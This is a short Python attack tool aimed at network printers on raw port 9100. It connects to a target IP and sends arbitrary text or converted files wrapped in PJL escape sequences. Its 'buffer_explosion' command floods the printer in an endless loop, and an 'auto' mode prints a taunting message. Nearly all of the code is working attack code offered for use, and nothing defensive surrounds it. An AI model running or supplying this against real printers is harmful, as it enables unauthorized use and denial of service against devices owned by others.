import argparse
import socket
import cmd
import sys
import subprocess
import select

parser = argparse.ArgumentParser()
parser.add_argument("target", help="ip address of printer")
parser.add_argument("-A", "--auto", help="auto mode to attack", action="store_true")
args = parser.parse_args()

UEL = '\x1b%-12345X' #universal exit language

class printer(cmd.Cmd, object):
	def __init__(self, args):
		super(printer, self).__init__()
		cmd.Cmd.__init__(self)
		try:
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM )
			self.sock.settimeout(100)
			self.sock.connect((args.target, 9100))
			print("connection to " + args.target + "has established.")
		except:
			print("connection to " + args.target + "failed.")
	def do_print_text(self, arg):
		if not arg:
			arg = input("text:")
		arg = arg.strip('"')
		data = UEL + arg + UEL
		self.sock.sendall(data.encode())
	def do_print_file(self, arg):
		if not arg:
			arg = input("file name:")
		if arg.endswith('.txt'):
			f = open(arg)
			data = ""
			try:
				data += f.read()
			finally:
				f.close()
			data = bytes(UEL + data + UEL, 'utf-8')
		else:
			pdf = ['-density', '300'] if arg.endswith('.pdf') else []
			cmd = ['magick'] + pdf + [arg, '-quality', '100', 'pcl:-']
			out, err = subprocess.PIPE, subprocess.PIPE
			p = subprocess.Popen(cmd, stdout=out, stderr=err)
			data, stderr = p.communicate()
			data = bytes(UEL, 'utf-8') + data + bytes(UEL, 'utf-8')
			if stderr: print("Convert failed", stderr)
		self.sock.sendall(data)
	def do_buffer_explosion(self, arg):
		print('Enter any key to stop attacking!')
		while True:
			data = ''
			for i in range(100000):
				data += 'I am sorry'
			data = bytes(UEL + data + UEL, 'utf-8')
			self.sock.sendall(data)
			if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
				break
	def do_exit(self, arg):
		sys.exit()
	def auto(self):
		data = UEL + 'hi, sorry, bye bye' + UEL
		self.sock.sendall(data.encode())
		sys.exit()
		

if __name__ == '__main__':
	hackedprinter = printer(args)
	if args.auto:
		hackedprinter.auto()
	else:
		hackedprinter.cmdloop()
